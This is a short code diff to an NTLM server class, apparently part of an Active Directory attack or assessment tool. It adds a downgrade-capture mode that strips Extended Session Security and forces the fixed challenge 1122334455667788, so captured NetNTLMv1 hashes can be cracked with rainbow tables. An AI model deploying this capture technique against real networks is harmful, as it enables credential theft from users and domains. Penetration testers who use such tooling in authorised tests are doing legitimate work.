@@ -390,8 +390,21 @@ class NTLMServerNative:
 			flags &= ~NegotiateFlags.NEGOTIATE_SIGN
 			flags &= ~NegotiateFlags.TARGET_TYPE_SERVER
 
+			# ADSCAN: NTLMv1 downgrade-capture mode (Responder --disable-ess parity).
+			# When the capture credential requests a downgrade, clear Extended Session
+			# Security so a v1-capable client returns a plain NetNTLMv1 (rainbow-crackable
+			# via crack.sh with the fixed 1122334455667788 server challenge) instead of the
+			# non-rainbow-crackable NTLMv1-ESS. Absent/False attr => unchanged (ESS stays on).
+			if getattr(self.credential, 'force_ntlm_downgrade', False):
+				flags &= ~NegotiateFlags.NEGOTIATE_EXTENDED_SESSIONSECURITY
+
 			self.ntlmChallenge = NTLMChallenge.construct(
-				challenge = os.urandom(8),
+				# ADSCAN: use the server's configured challenge. ``self.challenge`` honors
+				# ``credential.challenge`` (default random os.urandom(8) at __init__). This
+				# was previously hardcoded ``os.urandom(8)`` here, which silently ignored any
+				# configured fixed challenge — the bug that made a fixed 1122334455667788
+				# downgrade challenge impossible. Default path is byte-identical (still random).
+				challenge = self.challenge,
 				targetName = self.credential.negotiate_domain if self.credential.negotiate_domain is not None else '',
 				targetInfo = targetinfo,
 				version = self.credential.negotiate_version,
